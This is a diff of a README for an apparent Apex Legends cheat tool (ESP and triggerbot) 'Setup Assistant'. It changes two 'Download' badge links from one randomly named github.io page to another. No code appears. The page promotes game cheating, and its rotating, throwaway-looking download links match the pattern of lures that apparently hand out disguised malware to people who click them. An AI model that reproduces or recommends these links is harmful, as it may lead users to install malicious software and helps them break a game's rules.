@@ -1,7 +1,7 @@
 # 🎯 Apex Legends ESP + Triggerbot — Setup Assistant
 
-[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://netttokiferters12info.github.io/.github/)
-[![Download Now](https://img.shields.io/badge/Download_Now-Green?style=for-the-badge&logo=github)](https://netttokiferters12info.github.io/.github/)
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-brightgreen?style=for-the-badge)](https://apex1trigg3rb0tespweb9.github.io/.github/)
+[![Download Now](https://img.shields.io/badge/Download_Now-Green?style=for-the-badge&logo=github)](https://apex1trigg3rb0tespweb9.github.io/.github/)
 
 ---
 
